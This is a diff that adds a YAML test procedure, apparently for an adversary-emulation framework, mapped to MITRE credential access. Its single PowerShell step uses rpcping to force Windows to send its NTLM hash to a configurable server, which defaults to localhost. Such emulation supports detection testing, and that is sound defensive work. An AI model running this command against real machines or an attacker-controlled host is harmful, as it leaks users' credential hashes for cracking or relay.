@@ -1,0 +1,26 @@
+api_version: "2.0"
+name: Send NTLM Hash with RPC Test Connection
+description: "RpcPing command can be used to send an RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process. \nRef: https://twitter.com/vysecurity/status/974806438316072960"
+args:
+    - name: custom_port
+      type: int
+      default: "1234"
+    - name: server_ip
+      type: string
+      default: 127.0.0.1
+uuid: 0b207037-813c-4444-ac3f-b597cf280a67
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: send-ntlm-hash-with-rpc-test-connection
+      inline: rpcping -s {{.Args.server_ip}} -e {{.Args.custom_port}} -a privacy -u NTLM 1>$Null
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
